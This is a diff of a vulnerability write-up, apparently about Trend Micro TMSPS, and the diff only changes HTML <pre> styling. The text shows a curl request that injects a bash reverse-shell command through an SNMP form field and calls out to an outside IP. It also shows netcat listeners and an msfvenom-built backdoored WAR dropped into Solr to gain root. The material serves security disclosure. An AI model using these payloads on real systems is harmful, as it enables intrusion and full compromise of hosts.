@@ -203,13 +203,13 @@ static function SetFirewall($IP, $Netmask) {
 
 The different vulnerabilities were easily proven with curl, such as by using this command where get a reverse shell using interactive bash:
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 $ curl 'https://127.0.0.1:8443/php/admin_notification.php' -H 'Cookie: 590848d208960aa9=q3fk366otcapsp7vur00tp0to3' -H 'Origin: https://127.0.0.1:8443' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Referer: https://127.0.0.1:8443/php/admin_notification.php?sid=590848d208960aa9' -H 'Connection: keep-alive' --data 'EnableSNMP=on&Community=hello&submit=Save&pubkey=snip&sid=590848d208960aa9&spare_EnableSNMP=1&spare_Community=test;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.25%2F4444%200%3E%261;&spare_EnableIPRestriction=0&spare_AllowGroupIP=&spare_AllowGroupNetmask=' --compressed --insecure --http1.0
 </pre>
 
 Let's run netcat and wait for the shell to drop !
 
-<pre style="background-color:black;color:white;font-family:'monospace';">
+<pre>
 $ nc -lv 4444
 bash: no job control in this shell
 bash-3.2$ id
@@ -225,7 +225,7 @@ bash-3.2$ pwd
 It got interesting when I discovered that TMSPS servers are running an Apache Solr server to - presumably - communicate with OfficeScan clients.
 Solr runs on Jetty and the webserv user has write access to the webapps directory. However, auto-deploy of war files is not enabled by default.
 
-<pre style="background-color:black;color:white;font-family:'monospace';">
+<pre>
 bash-3.2$ cd /var/tmcss/solr/webapps
 bash-3.2$ ls -alh
 total 3.9M
@@ -236,7 +236,7 @@ drwxr-xr-x 9 webserv webserv 4.0K Apr 29 20:03 ..
 
 Furthermore, I found out that this server is running - you guessed it - as root.
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 bash-3.2$ ps aux
 --snip--
 root      2265  0.3  6.8 612340 69804 ?        Sl   22:03   0:03 /usr/java/default/bin/java -Dsolr.solr.home=/var/tmcss/solr/solr -Djetty.port=8983 -Djetty.logs=/var/tmcss/solr/logs -Djetty.home=/var/tmcss/solr -Djava.io.tmpdir=/tmp -jar /var/tmcss/solr/start.jar /var/tmcss/solr/etc/jetty-logging.xml /var/tmcss/solr/etc/jetty.xml
@@ -245,12 +245,12 @@ root      2265  0.3  6.8 612340 69804 ?        Sl   22:03   0:03 /usr/java/defau
 From there, and making the assumptions that we already have credentials, we could drop a backdoored .war file there and restart the logging service from the custom CLI in order to get a shell with root privileges.
 
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > solr.war
 Payload size: 1099 bytes
 </pre>
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';"
+<pre>
 >
 Last login: Wed Jul  6 22:16:01 2016 from 10.0.2.2
 
@@ -274,7 +274,7 @@ Starting Jetty: STARTED Jetty Wed Jul  6 22:46:41 CEST 2016
 >
 </pre>
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 $ tail /var/tmcss/debuglogs/jetty.log
 2016-07-06 22:46:42.516::INFO:  Extract jar:file:/var/tmcss/solr/webapps/solr.war!/ to /var/tmcss/solr/work/Jetty_0_0_0_0_8983_solr.war__solr__k1kf17/webapp
 2016-07-06 22:46:42.724::INFO:  Started SocketConnector @ 0.0.0.0:8983
@@ -282,7 +282,7 @@ $ tail /var/tmcss/debuglogs/jetty.log
 
 And once you request your backdoor JSP file, your root shell will drop :)
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 $ nc -l 4445
 id
 uid=0(root) gid=0(root) groups=0(root),6(disk)
